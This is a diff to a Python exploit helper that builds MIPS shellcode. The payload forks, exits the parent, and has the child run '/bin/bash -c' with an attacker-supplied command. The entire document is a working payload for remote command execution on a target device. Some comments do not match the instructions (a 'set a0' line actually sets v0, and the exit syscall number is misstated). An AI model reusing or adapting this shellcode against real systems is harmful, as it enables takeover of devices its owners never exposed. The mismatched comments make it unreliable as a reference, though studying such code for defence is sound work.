@@ -99,26 +99,36 @@ def build_shellcode(shellCmd):
     
     # The shell code execution starts here!
     shell_code += struct.pack('>L', 0x24500000)    # addiu s0, v0, 0           # s0 = v0                                                Save the shellcode_start_address in s0 (in v0 we have the address of the stack where the shellcode starts [<-- pointing to this location exactly]) 
-    shell_code += struct.pack('>L', 0x26040040)    # addiu a0, s0, 0x40        # a0 = shellcode_start_address + 0x40                    Calculate the address of string "/bin/bash" and put it in a0 (the first parameter of execve) 
+    shell_code += struct.pack('>L', 0x24020fa2)    # addiu v0, zero, 0xfa2     # v0 = 4002 (fork)                                       Put the syscall number of fork (4002) in v0
+    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start fork()
+    shell_code += struct.pack('>L', 0x10400003)    # beqz v0, 0x10             # jump 12 byte forward if v0 == 0                        Jump to execve part of the shellcode if PID is 0
+    
+    # if v0 != 0 [res of fork()]
+    shell_code += struct.pack('>L', 0x24020001)    # addiu v0, zero, 1         # a0 = 1                                                 Put exit parameter in a0
+    shell_code += struct.pack('>L', 0x24020fa1)    # addiu v0, zero, 0xfa1     # v0 = 4001 (exit)                                       Put the syscall number of exit (4002) in v0
+    shell_code += struct.pack('>L', 0x0000000c)	   # syscall                   # launch syscall                                         Start exit(1)
+
+    # if v0 == 0 [res of fork()]
+    shell_code += struct.pack('>L', 0x26040050)    # addiu a0, s0, 0x50        # a0 = shellcode_start_address + 0x50                    Calculate the address of string "/bin/bash" and put it in a0 (the first parameter of execve) 
     shell_code += struct.pack('>L', 0xae04fff0)    # sw a0, -16(s0)            # shellcode_start_address[-16] = bin_bash_address        Write in the first entry of the "argv" array the address of the string "/bin/bash" 
-    shell_code += struct.pack('>L', 0x26110050)    # addiu s1, s0, 0x50        # s1 = shellcode_start_address + 0x50                    Calculate the address of string "-c" and put it in s1 
+    shell_code += struct.pack('>L', 0x26110060)    # addiu s1, s0, 0x60        # s1 = shellcode_start_address + 0x60                    Calculate the address of string "-c" and put it in s1 
     shell_code += struct.pack('>L', 0xae11fff4)    # sw s1, -12(s0)            # shellcode_start_address[-12] = c_address               Write in the second entry of the "argv" array the address of the string "-c" 
-    shell_code += struct.pack('>L', 0x26110060)    # addiu s1, s0, 0x60        # s1 = shellcode_start_address + 0x60                    Calculate the address of string "shellCmd" and put it in s1  
+    shell_code += struct.pack('>L', 0x26110070)    # addiu s1, s0, 0x70        # s1 = shellcode_start_address + 0x70                    Calculate the address of string "shellCmd" and put it in s1  
     shell_code += struct.pack('>L', 0xae11fff8)    # sw s1, -8(s0)             # shellcode_start_address[-8]  = shellCmd_address        Write in the third entry of the "argv" array the address of the string "shellCmd" 
     shell_code += struct.pack('>L', 0xae00fffc)    # sw zero, -4(s0)           # shellcode_start_address[-4]  = 0x00                    Write NULL address as end of argv_array and envp_array
     shell_code += struct.pack('>L', 0x2205fff0)    # addi a1, s0, -16          # a1 = shellcode_start_address - 16                      Put the address of argv_array in a1 (the second parameter of execve)
     shell_code += struct.pack('>L', 0x2206fffc)    # addi a2, s0, -4           # a2 = shellcode_start_address - 4                       Put the address of envp_array in a2 (the third parameter of execve)
-    shell_code += struct.pack('>L', 0x24020fab)    # addiu v0, zero, 0xfab     # v0 = 4011                                              Put the syscall number of execve (4011) in v0   (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h)
+    shell_code += struct.pack('>L', 0x24020fab)    # addiu v0, zero, 0xfab     # v0 = 4011 (execve)                                     Put the syscall number of execve (4011) in v0   (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h)
     shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start execve("/bin/bash", ["/bin/bash", "-c", "shellCmd", NULL], [NULL])
-    
-    shell_code += b'P' * (0x40 - len(shell_code))   # offset to simplify string address calculation  
-    shell_code += b'/bin/bash\x00'                           # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x40]                 <--- bin_bash_address
-    
-    shell_code += b'P' * (0x50 - len(shell_code))   # offset to simplify string address calculation
-    shell_code += b'-c\x00'                                  # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x50]                 <--- c_address
+
+    shell_code += b'P' * (0x50 - len(shell_code))   # offset to simplify string address calculation  
+    shell_code += b'/bin/bash\x00'                           # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x50]                 <--- bin_bash_address
     
     shell_code += b'P' * (0x60 - len(shell_code))   # offset to simplify string address calculation
-    shell_code += shellCmd + b'\x00'                         #                                                    [shellcode_start + 0x60]                 <--- shellCmd_address
+    shell_code += b'-c\x00'                                  # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x60]                 <--- c_address
+    
+    shell_code += b'P' * (0x70 - len(shell_code))   # offset to simplify string address calculation
+    shell_code += shellCmd + b'\x00'                         #                                                    [shellcode_start + 0x70]                 <--- shellCmd_address
 
     return shell_code
 
